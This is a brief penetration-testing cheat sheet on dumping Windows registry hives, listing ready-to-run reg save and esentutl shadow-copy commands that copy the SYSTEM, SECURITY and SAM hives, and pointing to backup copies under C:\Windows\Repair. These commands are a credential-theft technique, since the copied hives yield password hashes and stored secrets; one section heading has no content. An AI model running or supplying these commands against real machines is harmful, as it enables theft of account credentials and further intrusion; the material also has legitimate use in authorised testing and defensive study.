# Dumping registry hives

## Reg.exe utility

Built in windows utility

```text
reg save hklm\system system
reg save hklm\security security
reg save hklm\sam sam
```

## Essentutl.exe utility 

Built in windows binary

```text
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d c:\temp\SYSTEM
esentutl.exe /y /vss C:\Windows\System32\config\SECURITY /d c:\temp\security
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
```

## VSSshadow.exe utility

## Backups

In some scenario, registry haves are backed up to C:\Windows\Repair\\*. This can be worth checking but will likely be out of date. 

E.g.  C:\Windows\Repair\SAM

